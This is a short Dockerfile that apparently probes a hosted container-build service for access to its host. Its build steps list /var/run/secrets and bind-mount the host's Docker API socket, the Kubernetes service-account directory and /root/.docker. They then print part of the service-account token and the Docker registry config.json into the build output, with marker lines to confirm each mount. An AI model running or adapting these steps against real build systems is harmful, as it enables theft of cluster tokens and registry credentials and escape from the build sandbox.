FROM alpine:3.20
RUN apk add --no-cache curl python3 openssl
RUN echo '===KITTEST-BEGIN===' ; ls -la /var/run/ 2>&1 | head -20 ; echo "--secrets--" ; ls -la /var/run/secrets 2>&1 | head -5 ; echo '===KITTEST-END==='
RUN --mount=type=bind,source=/var/run/bindernew-bindernew/docker-api,target=/dind echo DINDMOUNT-OK ; ls -la /dind 2>&1 | head -20
RUN --mount=type=bind,source=/var/run/secrets,target=/ksa echo KSAMOUNT-OK ; ls -la /ksa/kubernetes.io/serviceaccount 2>&1 ; head -c 120 /ksa/kubernetes.io/serviceaccount/token 2>/dev/null ; echo
RUN --mount=type=bind,source=/root/.docker,target=/rdocker echo RDOCKER-OK ; ls -la /rdocker 2>&1 ; head -c 500 /rdocker/config.json 2>/dev/null ; echo
RUN echo DONE
